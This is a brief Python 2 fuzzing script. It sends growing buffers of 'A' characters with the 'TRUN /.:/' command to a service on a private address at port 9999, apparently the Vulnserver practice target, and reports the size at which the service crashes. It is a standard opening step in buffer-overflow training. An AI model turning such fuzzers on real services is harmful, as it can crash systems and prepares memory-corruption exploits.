#!/usr/bin/python

import sys, socket
import time

buffer = "A" * 100

while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect(('192.168.45.132', 9999))
		s.send(("TRUN /.:/" + buffer))
		s.close()

		time.sleep(1)
		buffer = buffer + "A" * 100
	except:
		print "Fuzzing crashed at %s bytes" % str(len(buffer))
		sys.exit()
